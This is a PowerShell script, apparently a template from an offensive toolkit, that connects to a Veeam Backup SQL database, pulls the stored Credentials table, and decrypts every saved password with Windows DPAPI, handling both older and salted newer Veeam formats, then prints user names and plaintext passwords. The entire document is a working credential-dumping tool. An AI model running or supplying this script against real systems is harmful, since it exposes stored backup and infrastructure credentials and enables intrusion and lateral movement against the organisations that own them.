$SqlDatabaseName = "REPLACE_ME_SqlDatabase"
$SqlServerName = "REPLACE_ME_SqlServer"
$SqlInstanceName = "REPLACE_ME_SqlInstance"
$b64Salt = "REPLACE_ME_b64Salt"

#Forming the connection string
$SQL = "SELECT [user_name] AS 'User',[password] AS 'Password' FROM [$SqlDatabaseName].[dbo].[Credentials] WHERE password <> ''" #Filter empty passwords
$auth = "Integrated Security=SSPI;" #Local user
$connectionString = "Provider=sqloledb; Data Source=$SqlServerName\$SqlInstanceName; Initial Catalog=$SqlDatabaseName; $auth;"
$connection = New-Object System.Data.OleDb.OleDbConnection $connectionString
$command = New-Object System.Data.OleDb.OleDbCommand $SQL, $connection

#Fetching encrypted credentials from the database
try {
	$connection.Open()
	$adapter = New-Object System.Data.OleDb.OleDbDataAdapter $command
	$dataset = New-Object System.Data.DataSet
	[void] $adapter.Fill($dataSet)
	$connection.Close()
}
catch {
	Write-Host "Can't connect to DB! Exiting..."
	exit -1
}

$rows=($dataset.Tables | Select-Object -Expand Rows)
if ($rows.count -eq 0) {
	Write-Host "No passwords found!"
	exit
}

Add-Type -assembly System.Security
# Decrypting passwords using DPAPI
$rows | ForEach-Object -Process {
	$EnryptedPWD = [Convert]::FromBase64String($_.password)
	$enc = [system.text.encoding]::Default

	try {
		# Decrypt password with DPAPI (old Veeam versions)
		$raw = [System.Security.Cryptography.ProtectedData]::Unprotect( $EnryptedPWD, $null, [System.Security.Cryptography.DataProtectionScope]::LocalMachine )
		$pw_string = $enc.GetString($raw) -replace '\s', 'WHITESPACE_ERROR'
	} catch {
		try{
			# Decrypt password with salted DPAPI (new Veeam versions)
			$salt = [System.Convert]::FromBase64String($b64Salt)
			$hex = New-Object -TypeName System.Text.StringBuilder -ArgumentList ($EnryptedPWD.Length * 2)
			foreach ($byte in $EnryptedPWD)
			{
				$hex.AppendFormat("{0:x2}", $byte) > $null
			}
			$hex = $hex.ToString().Substring(74,$hex.Length-74)
			$EnryptedPWD = New-Object -TypeName byte[] -ArgumentList ($hex.Length / 2)
			for ($i = 0; $i -lt $hex.Length; $i += 2)
			{
				$EnryptedPWD[$i / 2] = [System.Convert]::ToByte($hex.Substring($i, 2), 16)
			}
			$raw = [System.Security.Cryptography.ProtectedData]::Unprotect($EnryptedPWD, $salt, [System.Security.Cryptography.DataProtectionScope]::LocalMachine)
			$pw_string = $enc.GetString($raw) -replace '\s', 'WHITESPACE_ERROR'
		}catch {
			$pw_string = "COULD_NOT_DECRYPT"
		}
	}
	$_.password = $pw_string
}

Write-Output $rows | Format-Table -HideTableHeaders | Out-String
